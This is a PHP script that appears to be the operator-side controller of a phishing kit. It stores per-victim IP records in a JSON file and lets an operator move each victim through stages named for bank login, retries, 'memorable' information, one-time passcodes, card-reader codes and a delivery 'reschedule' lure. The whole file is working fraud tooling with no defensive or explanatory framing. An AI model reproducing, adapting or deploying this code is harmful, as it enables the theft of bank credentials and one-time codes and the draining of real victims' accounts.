<?php
// Configuration
$json_file = 'status.json';

// Check if POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = filter_input(INPUT_POST, 'action', FILTER_SANITIZE_STRING);
    $actionCard = filter_input(INPUT_POST, 'action-card', FILTER_SANITIZE_STRING);
    $ip = filter_input(INPUT_POST, 'IP', FILTER_VALIDATE_IP);
    $cardReaderCode = filter_input(INPUT_POST, 'CardReaderCode', FILTER_SANITIZE_STRING);

    // Read existing JSON data
    $json_data = [];
    if (file_exists($json_file)) {
        $json_content = file_get_contents($json_file);
        if ($json_content !== false) {
            $json_data = json_decode($json_content, true) ?: [];
        }
    }

    // Handle card action separately
    if ($actionCard === 'card' && !empty($cardReaderCode)) {
        if (isset($json_data[$ip])) {
            $json_data[$ip]['CustomCardCode'] = $cardReaderCode;
            $json_data[$ip]['Status'] = 'card';
        }
    } else {
        // Handle regular actions
        switch ($action) {
            case 'first':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'first';
                }
                break;
            
            case 'login':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'login';
                }
                break;
            
            case 'login_retry':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'login_retry';
                }
                break;
            
            case 'login2':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'login2';
                }
                break;
            
            case 'reschedule':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'reschedule';
                }
                break;
            
            case 'bnk':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk';
                }
                break;
            
            case 'bnk_log':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_log';
                }
                break;
            
            case 'bnk_log_retry':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_log_retry';
                }
                break;
            
            case 'bnk_memorable':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_memorable';
                }
                break;
            
            case 'bnk_memorable_retry':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_memorable_retry';
                }
                break;
            
            case 'bnk_otp':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_otp';
                }
                break;
            
            case 'bnk_otp_retry':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'bnk_otp_retry';
                }
                break;
            
            case 'done':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'done';
                }
                break;
            
            case 'waiting':
                if (isset($json_data[$ip])) {
                    $json_data[$ip]['Status'] = 'waiting';
                }
                break;

            default:
                http_response_code(400);
                echo json_encode(['error' => 'Invalid action']);
                exit;
        }
    }

    // Write updated JSON data to file
    if (file_put_contents($json_file, json_encode($json_data, JSON_PRETTY_PRINT)) !== false) {
        http_response_code(200);
        echo json_encode(['message' => 'Record updated successfully']);
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to write to file']);
    }
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
}
?>